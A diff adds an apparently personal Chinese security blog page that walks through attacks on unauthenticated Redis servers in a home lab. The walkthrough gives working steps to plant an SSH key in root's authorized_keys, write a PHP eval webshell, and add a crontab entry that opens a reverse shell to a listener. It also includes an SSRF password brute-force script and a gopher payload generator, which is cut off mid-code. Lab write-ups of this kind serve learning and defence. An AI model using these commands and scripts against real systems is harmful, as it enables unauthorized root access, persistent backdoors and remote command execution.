@@ -1,0 +1,762 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh_CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="本文简单介绍了Redis的基本命令,演示了Redis未授权访问的3种攻击方式">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Redis漏洞利用">
+<meta property="og:url" content="http://example.com/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="sxq">
+<meta property="og:description" content="本文简单介绍了Redis的基本命令,演示了Redis未授权访问的3种攻击方式">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E6%A1%8C%E9%9D%A2/blog/source/_posts/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20240307160114180.png">
+<meta property="og:image" content="http://example.com/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E6%A1%8C%E9%9D%A2/blog/source/_posts/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20240307160219931.png">
+<meta property="og:image" content="http://example.com/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E6%A1%8C%E9%9D%A2/blog/source/_posts/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20240307160506294.png">
+<meta property="og:image" content="http://example.com/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E6%A1%8C%E9%9D%A2/blog/source/_posts/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20240307160259833.png">
+<meta property="og:image" content="http://example.com/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E6%A1%8C%E9%9D%A2/blog/source/_posts/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20240307160318019.png">
+<meta property="og:image" content="http://example.com/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E6%A1%8C%E9%9D%A2/blog/source/_posts/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20240307160332415.png">
+<meta property="og:image" content="http://example.com/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E6%A1%8C%E9%9D%A2/blog/source/_posts/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20240307160708463.png">
+<meta property="og:image" content="http://example.com/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E6%A1%8C%E9%9D%A2/blog/source/_posts/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/Snipaste_2024-03-07_15-29-02.png">
+<meta property="og:image" content="http://example.com/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E6%A1%8C%E9%9D%A2/blog/source/_posts/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20240307153254253.png">
+<meta property="og:image" content="http://example.com/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E6%A1%8C%E9%9D%A2/blog/source/_posts/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20240307154357423.png">
+<meta property="og:image" content="http://example.com/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E6%A1%8C%E9%9D%A2/blog/source/_posts/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20240307155752249.png">
+<meta property="og:image" content="http://example.com/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E6%A1%8C%E9%9D%A2/blog/source/_posts/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20240307162515593.png">
+<meta property="og:image" content="http://example.com/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E6%A1%8C%E9%9D%A2/blog/source/_posts/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20240307162611553.png">
+<meta property="og:image" content="http://example.com/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E6%A1%8C%E9%9D%A2/blog/source/_posts/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20240307162713964.png">
+<meta property="og:image" content="http://example.com/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E6%A1%8C%E9%9D%A2/blog/source/_posts/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20240307163110038.png">
+<meta property="og:image" content="http://example.com/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E6%A1%8C%E9%9D%A2/blog/source/_posts/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20240307161552848.png">
+<meta property="og:image" content="http://example.com/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E6%A1%8C%E9%9D%A2/blog/source/_posts/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20240307164018721.png">
+<meta property="og:image" content="http://example.com/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E6%A1%8C%E9%9D%A2/blog/source/_posts/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20240307165146291.png">
+<meta property="og:image" content="http://example.com/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E6%A1%8C%E9%9D%A2/blog/source/_posts/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20240307164431430.png">
+<meta property="og:image" content="http://example.com/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E6%A1%8C%E9%9D%A2/blog/source/_posts/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20240307164516947.png">
+<meta property="og:image" content="http://example.com/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E6%A1%8C%E9%9D%A2/blog/source/_posts/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20240307165328540.png">
+<meta property="article:published_time" content="2024-03-07T07:05:02.000Z">
+<meta property="article:modified_time" content="2024-03-07T09:51:53.118Z">
+<meta property="article:author" content="sxq">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E6%A1%8C%E9%9D%A2/blog/source/_posts/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20240307160114180.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2024/03/07/Redis漏洞利用/"/>
+
+
+
+
+
+  <title>Redis漏洞利用 | sxq</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh_CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">sxq</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">一天找不到实习就写一天blog</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="sxq">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Redis漏洞利用</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2024-03-07T15:05:02+08:00">
+                2024-03-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+              <div class="post-description">
+                  本文简单介绍了Redis的基本命令,演示了Redis未授权访问的3种攻击方式
+              </div>
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>redis默认端口：6379</p>
+<h1 id="Redis介绍"><a href="#Redis介绍" class="headerlink" title="Redis介绍"></a>Redis介绍</h1><p>redis默认端口：6379</p>
+<h2 id="基本命令展示"><a href="#基本命令展示" class="headerlink" title="基本命令展示"></a>基本命令展示</h2><p>(redis不区分命令的大小写)</p>
+<p>基本信息：info</p>
+<p><img src="/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/桌面\blog\source\_posts\Redis漏洞利用\image-20240307160114180.png" alt="image-20240307160114180"> </p>
+<p>把键x的内容设为test：set x “test”</p>
+<p><img src="/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/桌面\blog\source\_posts\Redis漏洞利用\image-20240307160219931.png" alt="image-20240307160219931"> </p>
+<p>获取键x的值：get x</p>
+<p><img src="/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/桌面\blog\source\_posts\Redis漏洞利用\image-20240307160506294.png" alt="image-20240307160506294"> </p>
+<p>查看所有键：KEYS *</p>
+<p><img src="/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/桌面\blog\source\_posts\Redis漏洞利用\image-20240307160259833.png" alt="image-20240307160259833"> </p>
+<p>查看目录：config get dir</p>
+<p><img src="/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/桌面\blog\source\_posts\Redis漏洞利用\image-20240307160318019.png" alt="image-20240307160318019"> </p>
+<p>查看rdb文件名：config set dbfilename</p>
+<p><img src="/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/桌面\blog\source\_posts\Redis漏洞利用\image-20240307160332415.png" alt="image-20240307160332415"> </p>
+<p>获取一个不存在的键的值：get anotherkey</p>
+<p><img src="/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/桌面\blog\source\_posts\Redis漏洞利用\image-20240307160708463.png" alt="image-20240307160708463"> </p>
+<p>其他命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">INCR a                          	# 使用INCR命令将a的值增加1，a必须是数字</span><br><span class="line">config set protected-mode no    	# 关闭安全模式</span><br><span class="line">config set dir /root/redis      	# 设置保存目录</span><br><span class="line">config set dbfilename redis.rdb 	# 设置保存文件名</span><br><span class="line">save                            	# 进行一次备份操作</span><br><span class="line">flushall                            # 删除所有数据</span><br><span class="line">del key                             # 删除键为key的数据</span><br><span class="line">slaveof ip port                     # 设置主从关系</span><br><span class="line">redis-cli -h ip -p 6379 -a passwd   # 外部连接</span><br></pre></td></tr></table></figure>
+<h1 id="Redis未授权的3种常见攻击演示"><a href="#Redis未授权的3种常见攻击演示" class="headerlink" title="Redis未授权的3种常见攻击演示"></a>Redis未授权的3种常见攻击演示</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>攻击机：192.168.43.229(win10)</p>
+<p>靶机：192.168.43.217(kali)</p>
+<p>Redis版本：3.2.0</p>
+<p>kali安装Redis命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-3.2.0.tar.gz</span><br><span class="line">tar xzf redis-3.2.0.tar.gz</span><br><span class="line"><span class="built_in">cd</span> redis-3.2.0</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+<p>修改配置文件redis.conf，使得Redis可以远程访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注释bind 127.0.0.1</span><br><span class="line">protected-mode改成no</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/桌面\blog\source\_posts\Redis漏洞利用\Snipaste_2024-03-07_15-29-02.png" alt="Snipaste_2024-03-07_15-29-02"> </p>
+<p>启动redis服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./src/redis-server redis.conf</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/桌面\blog\source\_posts\Redis漏洞利用\image-20240307153254253.png" alt="image-20240307153254253"> </p>
+<p>goby扫一下靶机192.168.43.217，确实发现了开放的端口6379以及redis未授权漏洞</p>
+<p><img src="/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/桌面\blog\source\_posts\Redis漏洞利用\image-20240307154357423.png" alt="image-20240307154357423"> </p>
+<p>攻击机连上redis：redis-cli.exe -h 192.168.43.217</p>
+<p><img src="/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/桌面\blog\source\_posts\Redis漏洞利用\image-20240307155752249.png" alt="image-20240307155752249"> </p>
+<h2 id="写ssh-keygen公钥然后使用私钥登陆"><a href="#写ssh-keygen公钥然后使用私钥登陆" class="headerlink" title="写ssh-keygen公钥然后使用私钥登陆"></a>写ssh-keygen公钥然后使用私钥登陆</h2><h3 id="适用条件"><a href="#适用条件" class="headerlink" title="适用条件"></a>适用条件</h3><ol>
+<li>Redis服务使用ROOT账号启动</li>
+<li>服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</li>
+</ol>
+<h3 id="kali打开22端口"><a href="#kali打开22端口" class="headerlink" title="kali打开22端口"></a>kali打开22端口</h3><p>去掉端口、监听地址的注释</p>
+<p><img src="/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/桌面\blog\source\_posts\Redis漏洞利用\image-20240307162515593.png" alt="image-20240307162515593"> </p>
+<p>开启远程登录</p>
+<p><img src="/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/桌面\blog\source\_posts\Redis漏洞利用\image-20240307162611553.png" alt="image-20240307162611553"> </p>
+<p>开启用户密码作为连接验证，保存退出</p>
+<p><img src="/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/桌面\blog\source\_posts\Redis漏洞利用\image-20240307162713964.png" alt="image-20240307162713964"> </p>
+<p>开启sshd服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service sshd start</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/桌面\blog\source\_posts\Redis漏洞利用\image-20240307163110038.png" alt="image-20240307163110038"> </p>
+<h3 id="第一步：密钥对生成"><a href="#第一步：密钥对生成" class="headerlink" title="第一步：密钥对生成"></a>第一步：密钥对生成</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+<p> 得到私钥文件key，公钥文件key.pub</p>
+<p><img src="/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/桌面\blog\source\_posts\Redis漏洞利用\image-20240307161552848.png" alt="image-20240307161552848"> </p>
+<h3 id="第二步：执行命令"><a href="#第二步：执行命令" class="headerlink" title="第二步：执行命令"></a>第二步：执行命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">set x &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHaX5ZkG/saOzijPajIYFCQVCz1x4huUj9ATK7WoYzb4X7lQT0JAg4Xei/9mpi2RvA9YkcQC6wmJWETuIvKRYkby8J+tvRPpekk1wQ35rLfoyp8kkoAb2/cmMh0BHGFSHh1xchrVYPDdDZvQvgD4r7fFGHiFgvkAzn6xeoqbNdqAKb2n0Gw17EGJ3P7ajl3EnXYHayMx3Nq2lcnZMGBH+XQKS6ngaPrwSXYVE/MwmlBwqM5eXEt76Kh/wGuyPnQKIzXk/B/CYEAwqxyKPBwQ+vPcr40+NTqDXM070+8coc9tXlX8MKaqPmh4Wb4YFkV8FDypj34mln35M6wHM/vExgmlUo1lAdXYFQxhuVybUsZYW3PM6kW46rlCcoiYTV+Xqs7R294X9Abrh0TMTj74PFC1yHUnV0wBq8Yrx5IA1lYWpBNfK4YCbNVvv2PBRTOfixo8fRGHZl7HMg92yfOFoCOHUVx9/HAUS2iFOSYXrsql1Wbw3ljUTfsAsxrafTAGU= asus@LAPTOP-93KMIID5\n\n\n&quot; #这里前后必须要有\n\n\n，否则会失败，我也不知道为什么。里面写入公钥</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<h3 id="第三步：连接ssh"><a href="#第三步：连接ssh" class="headerlink" title="第三步：连接ssh"></a>第三步：连接ssh</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i 私钥文件名 root@addr</span><br></pre></td></tr></table></figure>
+<p> <img src="/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/桌面\blog\source\_posts\Redis漏洞利用\image-20240307164018721.png" alt></p>
+<h2 id="向web物理路径写Webshell"><a href="#向web物理路径写Webshell" class="headerlink" title="向web物理路径写Webshell"></a>向web物理路径写Webshell</h2><h3 id="适用条件-1"><a href="#适用条件-1" class="headerlink" title="适用条件"></a>适用条件</h3><p>确保开启apache服务</p>
+<p><img src="/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/桌面\blog\source\_posts\Redis漏洞利用\image-20240307165146291.png" alt="image-20240307165146291"> </p>
+<h3 id="第一步：执行命令"><a href="#第一步：执行命令" class="headerlink" title="第一步：执行命令"></a>第一步：执行命令</h3><p><img src="/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/桌面\blog\source\_posts\Redis漏洞利用\image-20240307164431430.png" alt="image-20240307164431430"> </p>
+<p><img src="/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/桌面\blog\source\_posts\Redis漏洞利用\image-20240307164516947.png" alt="image-20240307164516947"> </p>
+<h3 id="第二步：蚁剑连接"><a href="#第二步：蚁剑连接" class="headerlink" title="第二步：蚁剑连接"></a>第二步：蚁剑连接</h3><p>(别忘了ip前加http://)</p>
+<p><img src="/2024/03/07/Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/桌面\blog\source\_posts\Redis漏洞利用\image-20240307165328540.png" alt="image-20240307165328540"> </p>
+<h2 id="利用计划任务执行命令反弹shell"><a href="#利用计划任务执行命令反弹shell" class="headerlink" title="利用计划任务执行命令反弹shell"></a>利用计划任务执行命令反弹shell</h2><p>由于在windows上不好执行crontab，所以只记录一下方法</p>
+<h3 id="适用条件-2"><a href="#适用条件-2" class="headerlink" title="适用条件"></a>适用条件</h3><p>1、root启用Redis<br>2、redis无密码或者弱密码</p>
+<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>在Redis以root权限运行时可以写crontab来执行命令反弹shell</p>
+<p>首先监听端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 7999</span><br></pre></td></tr></table></figure>
+<p>之后连上redis执行以下命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> x <span class="string">&quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/ip/7999 0&gt;&amp;1\n&quot;</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron/</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<p>Centos的定时任务文件在/var/spool/cron/<br>Ubuntu定时任务文件在/var/spool/cron/crontabs/</p>
+<h1 id="当Redis遇上SSRF-待做"><a href="#当Redis遇上SSRF-待做" class="headerlink" title="当Redis遇上SSRF(待做)"></a>当Redis遇上SSRF(待做)</h1><h1 id="shiro-redis反序列化-待做"><a href="#shiro-redis反序列化-待做" class="headerlink" title="shiro-redis反序列化(待做)"></a>shiro-redis反序列化(待做)</h1><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="Redis弱口令爆破脚本"><a href="#Redis弱口令爆破脚本" class="headerlink" title="Redis弱口令爆破脚本"></a>Redis弱口令爆破脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.parse </span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://xx.xx.xx.xx:8000/ssrf.php?url=&quot;</span></span><br><span class="line"></span><br><span class="line">param = <span class="string">&#x27;dict://127.0.0.1:6788/auth:&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;d:\test\top100.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f: <span class="comment">#字典</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        passwd = f.readline()</span><br><span class="line">        all_url = url + param + passwd</span><br><span class="line">        <span class="comment"># print(all_url)</span></span><br><span class="line">        request = urllib.request.Request(all_url)</span><br><span class="line">        response = urllib.request.urlopen(request).read()</span><br><span class="line">        <span class="comment"># print(response)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;+OK\r\n+OK\r\n&quot;</span>.encode() <span class="keyword">in</span> response:  <span class="comment">#因为是不知道是否正确，可以用not in</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;redis passwd: &quot;</span> + passwd)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>Payload构造脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php eval($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;1.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span>        <span class="comment">#如果无密码就不加，如果有密码就加 </span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">     <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">     <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">     <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">     <span class="string">&quot;save&quot;</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title 